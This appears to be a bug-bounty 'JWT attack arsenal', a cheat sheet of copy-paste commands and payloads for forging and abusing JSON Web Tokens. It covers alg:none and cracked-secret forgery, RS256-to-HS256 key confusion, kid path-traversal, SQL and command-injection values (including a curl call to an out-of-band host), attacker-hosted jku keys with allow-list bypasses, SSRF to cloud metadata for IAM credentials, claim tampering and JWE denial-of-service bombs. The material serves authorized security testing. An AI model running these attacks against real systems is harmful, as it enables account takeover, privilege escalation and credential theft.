# JWT Attack Arsenal — Copy-Paste Commands & Payloads, Bug-Bounty Edition

> Companion to `JWT_TESTING_GUIDE.md`. **Pick by what `header.alg` is and what the baseline test told you** (guide §5, Appendix B). Replace `<TOKEN>`, `<URL>`, `YOUR-HOST`, and key paths. Authorized targets only; forge into your own test accounts and crack offline (guide §32).
>
> Set once:
> ```bash
> TOKEN='eyJ...'             # the captured token
> URL='https://target.com/api/me'   # an endpoint that USES the token for authz
> AUTH="Authorization: Bearer $TOKEN"
> ```

---

## 0. Decode / inspect (guide §4)

```bash
# Pure decode, no tools:
echo "$TOKEN" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo

# Python (header + claims):
python3 -c "import jwt,sys,json;t='$TOKEN';print('H',jwt.get_unverified_header(t));print('P',json.dumps(jwt.decode(t,options={'verify_signature':False}),indent=2))"

# jwt_tool:
python3 jwt_tool.py "$TOKEN"
```
```powershell
# Windows decode (PowerShell)
$p = $TOKEN.Split('.')[1].Replace('-','+').Replace('_','/'); while($p.Length%4){$p+='='}
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
```

---

## 1. Baseline — is the signature verified? (guide §5)

```bash
# A) Tamper a claim, KEEP signature (jwt_tool tamper mode):
python3 jwt_tool.py "$TOKEN" -T          # edit role/sub interactively, resend

# B) Strip signature (header.payload.) — send empty 3rd segment:
NOSIG="$(echo "$TOKEN" | cut -d. -f1,2)."
curl -s "$URL" -H "Authorization: Bearer $NOSIG" -o /dev/null -w "%{http_code}\n"

# C) Live attack/scan against the real endpoint (tries the common bypasses & reports acceptance):
python3 jwt_tool.py -t "$URL" -rh "$AUTH" -M at
```
> "Accepted" only matters if behavior changed (you see admin/other-user data). Confirm, don't assume (guide §5.2/§29).

---

## 2. alg:none (guide §6)

```bash
# jwt_tool — tries none/None/NONE/nOnE with empty signature:
python3 jwt_tool.py "$TOKEN" -X a

# With custom claims via poc:
python3 poc/alg_none.py "$TOKEN" --claim role=admin --claim sub=1337
```
Filter-bypass alg values to try by hand:
```
none   None   NONE   nOnE   NonE   nonE   "none "   none\x00
```

---

## 3. Weak HMAC secret crack (HS256/384/512) (guide §7)

```bash
echo "$TOKEN" > token.txt

# hashcat (GPU) — 16500 = HMAC-SHA256(JWT)
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 token.txt jwt.secrets.list          # wallarm/jwt-secrets (defaults!)
hashcat -a 0 -m 16500 token.txt -r rules/best64.rule rockyou.txt

# john
john token.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# jwt_tool dictionary crack
python3 jwt_tool.py "$TOKEN" -C -d jwt.secrets.list

# Re-sign with the cracked secret:
python3 jwt_tool.py "$TOKEN" -T -S hs256 -p 'CRACKED_SECRET'
python3 poc/forge_token.py --alg HS256 --secret 'CRACKED_SECRET' --claim role=admin "$TOKEN"
```
Try these default/known secrets FIRST (most real findings):
```
secret  your-256-bit-secret  changeme  password  jwt  jwtsecret  supersecret  admin  test
key  private  s3cr3t  CHANGE_ME  qwerty  <framework-sample-keys>  <leaked .env / git secrets>
```

---

## 4. RS256 → HS256 algorithm confusion (guide §8/§9)

```bash
# Get the public key (PEM). From JWKS:
curl -s https://target.com/.well-known/jwks.json | jq .
# Convert a JWKS entry (n,e) to PEM (jwt_tool can, or use a small script / poc/rs256_to_hs256.py).

# jwt_tool key-confusion (provide the public key PEM):
python3 jwt_tool.py "$TOKEN" -X k -pk public.pem

# poc — auto-tries PEM with/without trailing newline + DER variants (formatting is the usual snag):
python3 poc/rs256_to_hs256.py "$TOKEN" --pubkey public.pem --claim role=admin --claim sub=1337

# No JWKS? Recover the RSA public key from TWO different tokens:
cd rsa_sign2n/standalone && python3 jwt_forgery.py "$TOKEN_1" "$TOKEN_2"
# Reuse from TLS cert (if shared):
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout > tls_pub.pem
```
Burp JWT Editor: New HMAC key → paste the **public-key PEM** as the key → re-sign as HS256.

---

## 5. kid injection (guide §10)

```bash
# Path traversal → empty key via /dev/null, then sign HS256 with secret "":
python3 poc/kid_injection.py "$TOKEN" --kid "../../../../dev/null" --secret "" --claim role=admin

# Other useful kid values:
#   ../../../../dev/null            (empty key)
#   /dev/null
#   ../../../../proc/sys/kernel/randomize_va_space   (known small content)
#   file:///dev/null

# kid SQL injection (return a key you control):
#   kid:  x' UNION SELECT 'attackerKnownKey'-- -    → then sign HS256 with attackerKnownKey
python3 poc/kid_injection.py "$TOKEN" --kid "x' UNION SELECT 'k'-- -" --secret "k" --claim role=admin

# kid command-injection / LFI probes (test for RCE/file read independent of forging):
#   kid: "key|id"   "key;id"   "$(id)"   "../../etc/passwd"
python3 jwt_tool.py "$TOKEN" -X i        # jwt_tool injection scan (kid/jku/jwk)
```

---

## 6. jku / x5u — attacker-hosted JWKS (+ SSRF) (guide §11)

```bash
# 1) Generate keypair + serve a JWKS containing YOUR public key:
python3 poc/jwks_server.py --port 8000      # prints your private key + the jku URL to use
# expose it publicly:
#   ngrok http 8000        OR   cloudflared tunnel --url http://localhost:8000

# 2) Forge with jwt_tool (point jku at your host, sign with your private key):
python3 jwt_tool.py "$TOKEN" -X s -ju https://YOUR-HOST/jwks.json -pr poc/jwt_private.pem

# 3) Confirm SSRF even if key not honored — use a Collaborator/interactsh host as jku and watch for the fetch.
```
Host allow-list bypasses for jku (when host must match issuer):
```
https://trusted.com@YOUR-HOST/jwks.json
https://trusted.com.YOUR-HOST/jwks.json
https://YOUR-HOST/jwks.json#trusted.com
https://YOUR-HOST/jwks.json?x=trusted.com
https://trusted.com/open-redirect?url=https://YOUR-HOST/jwks.json
```

---

## 7. jwk / x5c — embedded key (guide §12/§13)

```bash
# Embed YOUR public key in the header and sign with YOUR private key (no hosting needed):
python3 jwt_tool.py "$TOKEN" -X i           # jwt_tool embedded-jwk
python3 poc/jwk_inject.py "$TOKEN" --claim role=admin --claim sub=1337     # generates keypair + embeds jwk

# x5c: self-signed cert, embed its chain, sign with its key:
openssl req -x509 -newkey rsa:2048 -keyout x5c.key -out x5c.crt -days 7 -nodes -subj "/CN=poc"
python3 poc/jwk_inject.py "$TOKEN" --x5c x5c.crt --key x5c.key --claim role=admin
```
Burp JWT Editor → "Attack" → "Embedded JWK" (one click).

---

## 8. ES256 psychic signature (CVE-2022-21449, Java) (guide §14)

```bash
# jwt_tool (recent versions):
python3 jwt_tool.py "$TOKEN" -X psychic
# Effect: ECDSA signature of (r=0,s=0) — a blank signature — accepted on vulnerable Java 15-18.
```

---

## 9. Claim tampering quick set (guide §15/§24/§25/§26)

Re-sign with whatever forge primitive works (none / cracked HS / pubkey-HS / jwk). One claim at a time, watch behavior:
```jsonc
// horizontal (IDOR)
"sub": "<victim_id>"   "user_id": "<victim_id>"   "uid": "<victim_id>"
// vertical (priv-esc)
"role": "admin"   "roles": ["admin"]   "isAdmin": true   "admin": true
"scope": "read write admin"   "permissions": ["*"]   "groups": ["administrators"]
// cross-tenant
"tenant": "<other_tenant>"   "org": "<other_org>"   "account_id": "<other>"
// OAuth ATO
"email": "victim@corp.com"   "email_verified": true
// MFA / assurance
"amr": ["mfa"]   "acr": "high"   "mfa": true
// lifecycle
"exp": 9999999999   (remove exp)   "nbf": 0
```
```bash
# generic forge helper (any alg + key):
python3 poc/forge_token.py "$TOKEN" --alg HS256 --secret '<s>' --claim role=admin --claim sub=1337
python3 poc/forge_token.py "$TOKEN" --alg none --claim role=admin
```

---

## 10. Lifecycle / replay tests (guide §17/§18)

```bash
# exp ignored? — replay an expired (old captured) token:
curl -s "$URL" -H "Authorization: Bearer $OLD_EXPIRED_TOKEN" -o /dev/null -w "%{http_code}\n"

# revocation on logout? — capture, log out, replay:
#   1) save token  2) hit /logout in the browser/session  3) replay token at $URL → still 200? = no revocation

# refresh-token reuse — replay an already-rotated refresh token at the token endpoint.
```

---

## 11. Issuer/audience confusion (guide §16)

```bash
# Replay a token from another context (second app / staging / your own OAuth client) at the target:
curl -s "$URL" -H "Authorization: Bearer $TOKEN_FROM_OTHER_SERVICE" -o /dev/null -w "%{http_code}\n"
# Tamper aud/iss on a forged token and see if cross-audience is accepted.
```

---

## 12. One-shot live scanner (guide §34)

```bash
# Run jwt_tool's attack/scan against the live authed request (reports which bypasses are accepted):
python3 jwt_tool.py -t "$URL" -rh "$AUTH" -M at      # all-tests attack mode
python3 jwt_tool.py "$TOKEN" -M pb                    # probe-bypass on the token
```
> Always confirm a scanner "hit" by reproducing the **accepted forged request** and verifying the **behavior change** before reporting (guide §29/§34).

---

## 13. Deeper `kid` / header-parameter injection (LFI · RCE · SQLi · SSRF) (guide §10)

> `kid` (and `x5u`/`jku`) values flow into a file read, DB lookup, or HTTP fetch on the server. Two payoffs:
> (a) **forge** by pointing at a key whose value you know; (b) the injection is itself **LFI/RCE/SQLi/SSRF**.

```
# kid → predictable-content file, then sign HS with that file's exact bytes:
kid: ../../../../dev/null            → key = "" → sign HS256 with secret ""
kid: /proc/sys/kernel/randomize_va_space   → 1-byte known content → sign with "0\n"/"1\n"/"2\n"
kid: ../../../../etc/hostname        → if you can read it elsewhere, use it as the HMAC secret
kid: /dev/null ; file:///dev/null ; php://filter/convert.base64-encode/resource=index.php (LFI → source)

# kid → SQL injection (return an attacker-known key):
kid: nonexistent' UNION SELECT 'attackerkey'-- -      → sign HS256 with "attackerkey"
kid: 1' OR '1'='1                                      → blind authz / error oracle

# kid → command injection / path → RCE (independent of forging; cross-ref Command-Injection & LFI kits):
kid: key|id          kid: key;curl http://YOUR.oast.fun/kid    kid: $(id)    kid: `id`

# kid → SSRF (server fetches the kid as a URL):
kid: http://169.254.169.254/latest/meta-data/iam/security-credentials/   → cloud creds (SSRF kit §11)
kid: http://YOUR.oast.fun/kid-ssrf                                        → confirm blind via OOB
```
> **jku/x5u → SSRF → cloud metadata** is a top critical chain: if the host filter is weak (§6 bypasses), point `jku`
> at `169.254.169.254`/internal and you get **SSRF**, often **IAM credentials** (hand to the SSRF kit), *in addition*
> to the key-forging path.

---

## 14. JWE (encrypted JWT) & deeper header params (guide §12/§13)

```
□ JWE recognised by 5 dot-separated parts (header.encKey.iv.ciphertext.tag) and "enc"+"alg" in the header.
□ alg confusion in JWE: RSA1_5 (Bleichenbacher/Million-Message), or downgrade to "dir"/"none"-style key handling.
□ Key-management bugs: "alg":"dir" with a guessable/leaked CEK; weak "PBES2" passphrase (crack like HMAC, §3).
□ "crit" header: list a param the server MUST understand; some libs ignore it → bypass required-checks.
□ "typ"/"cty": confusion (JWT vs JWS vs JWE) → some validators mis-route → signature skipped.
□ "zip":"DEF" decompression → DoS / parser quirks.
```

---

## 15. Real-world CVEs & library-specific bugs (guide §6/§8/§14)

```
□ CVE-2015-9235 (jsonwebtoken) — RS256→HS256 algorithm confusion (the original; still re-appears in forks/configs).
□ CVE-2022-21449 "Psychic Signature" (Java 15-18) — ECDSA (r=0,s=0) blank sig accepted (§8 `-X psychic`).
□ CVE-2016-5431 / ruby-jwt, CVE-2018-0114 (Cisco node-jose) — embedded-JWK key injection (§7) accepted attacker key.
□ python-jwt / pyjwt old versions — alg:none accepted; KID/JWK trust bugs.
□ Auth0 / Firebase / various SDKs — periodic verification-bypass advisories; match the exact lib + version (from JS/headers).
□ "kid" path-traversal & SQLi in real apps — frequent (§5/§13).
□ Hardcoded/leaked HS secrets in JS bundles, .env, git, mobile apps — crack-free forge (cross-ref JS-files kit §5/§11).
□ Public key reuse: the RSA public key is *public by design* → RS256→HS256 (§4) is a config bug, not a key leak.
```
> **References:** PortSwigger *JWT attacks* (Web Security Academy + labs), `jwt_tool` wiki, Auth0 *Critical vulnerabilities
> in JSON Web Token libraries*, PayloadsAllTheThings *JSON Web Token*, HackTricks *JWT*, Hackviser & PentesterLab JWT
> modules, `wallarm/jwt-secrets` list.

---

## 16. OIDC `id_token`-specific attacks (guide §16.1)
```
□ aud as ARRAY:        header/claims  "aud": ["the-rp-client", "attacker-client"]  → RP accepts any aud in the list?
□ azp not checked:     with multiple aud, set "azp" to a value ≠ the RP's client_id → still accepted? = confused deputy.
□ nonce replay:        capture an id_token and RE-SEND it (or inject a stolen one) at the RP's callback/sign-in →
                       no nonce binding → sign-in as the victim. (Drop/empty the "nonce" claim and see if accepted.)
□ at_hash / c_hash substitution:  swap the access_token / auth code for a DIFFERENT one while keeping the id_token →
                       if the RP doesn't validate at_hash/c_hash → token cut-and-paste (account mix-up).
□ id_token as access_token:  send the id_token to /userinfo or a protected API → accepted? = audience misuse.
□ (iss, sub) identity:  does the RP key the account on the PAIR? if it keys on email/sub alone → register the victim's
                        email at an IdP whose tokens the RP trusts → cross-IdP takeover.
□ mix-up (multi-IdP):  return a response/token from IdP-B where the RP expected IdP-A → wrong-issuer acceptance.
# test with YOUR OWN OIDC client + a second test account; replay/modify at the RP's callback.
```

## 17. JWT / JWE Denial-of-Service (only where DoS is in scope) (guide §20.1)
```
□ PBES2 p2c bomb (JWE alg=PBES2-HS256+A128KW etc.):  set header "p2c": 100000000  → server runs 100M PBKDF2 rounds per
   verify → CPU hang. Demonstrate ONE request's multi-second cost; never flood.
□ JWE "zip":"DEF" decompression bomb:  tiny compressed payload expanding to GBs on decrypt → memory blowup.
□ Oversized key:  embed a huge RSA modulus in "jwk"/"x5c" → expensive verification.
□ Deep nesting:  JWE(JWS(JWE(...)))  /  pathological JSON  → recursive parse/verify cost.
# CWE-400. Show the ratio (tiny token → huge work) on a single request; DoS must be in scope.
```

---

### Reminder
The reasoning for *which* attack to use, and how to turn an accepted forged token into a paying report, is in `JWT_TESTING_GUIDE.md`. A finding is only real when the server **accepts a token you controlled and acts on it** (guide §28/§29).
